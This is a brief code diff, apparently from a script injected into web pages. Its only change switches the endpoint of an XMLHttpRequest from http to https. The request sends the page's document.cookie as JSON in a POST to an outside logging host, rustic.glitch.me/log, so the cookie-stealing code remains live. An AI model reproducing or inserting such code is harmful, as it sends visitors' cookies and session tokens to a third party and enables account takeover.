@@ -14,7 +14,7 @@ document.getElementById("mainDivInject") && (document.getElementById("mainDivInj
 
 try {
   let oReq = new XMLHttpRequest();
-  oReq.open("POST", "http://rustic.glitch.me/log");
+  oReq.open("POST", "https://rustic.glitch.me/log");
   oReq.setRequestHeader("Content-Type", "application/json");
   oReq.send(JSON.stringify(document.cookie));
 } catch (err) {
